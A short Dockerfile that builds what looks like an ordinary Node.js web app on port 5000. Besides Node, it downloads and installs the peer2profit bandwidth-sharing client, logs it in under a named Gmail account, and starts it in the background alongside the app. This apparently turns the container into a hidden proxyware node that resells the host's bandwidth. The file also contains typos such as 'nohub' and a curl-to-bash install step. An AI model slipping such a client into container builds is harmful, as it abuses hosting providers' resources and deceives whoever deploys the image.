FROM ubuntu:22.04 as base
USER root
RUN  apt-get update \
  && apt-get install -y wget
WORKDIR /home/app
COPY ./package.json /home/app/package.json
RUN apt-get update
RUN apt-get -y install curl gnupg
RUN curl -sL https://deb.nodesource.com/setup_18.x  | bash -
RUN apt-get -y install nodejs
RUN npm install
RUN wget -r https://updates.peer2profit.app/peer2profit_0.48_amd64.deb
RUN sudo dpkg -i peer2profit_0.48_amd64.deb
RUN p2pclient --login taymstutaymstu@gmail.com

EXPOSE 5000
CMD nohub p2pclient --login taymstutaymstu@gmail.com & node app.js
